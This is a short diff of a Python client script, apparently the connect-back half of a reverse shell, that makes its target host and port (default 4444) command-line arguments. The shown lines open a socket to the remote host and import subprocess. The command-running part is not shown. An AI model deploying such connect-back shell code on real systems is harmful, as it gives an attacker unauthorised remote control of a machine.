@@ -1,8 +1,20 @@
 import socket
 import subprocess
+import sys
 
-REMOTE_HOST = '192.168.1.199' # '192.168.43.82'
-REMOTE_PORT = 4444 # 2222
+DEFAULT_HOST = 'localhost'
+DEFAULT_PORT = 4444
+
+
+REMOTE_HOST = DEFAULT_HOST
+REMOTE_PORT = DEFAULT_PORT
+
+if len(sys.argv)>1:
+    REMOTE_HOST = sys.argv[1] # '192.168.43.82'
+
+if len(sys.argv)>2:
+    REMOTE_PORT = int(sys.argv[2]) # 2222
+
 client = socket.socket()
 print("[-] Connection Initiating...")
 client.connect((REMOTE_HOST, REMOTE_PORT))
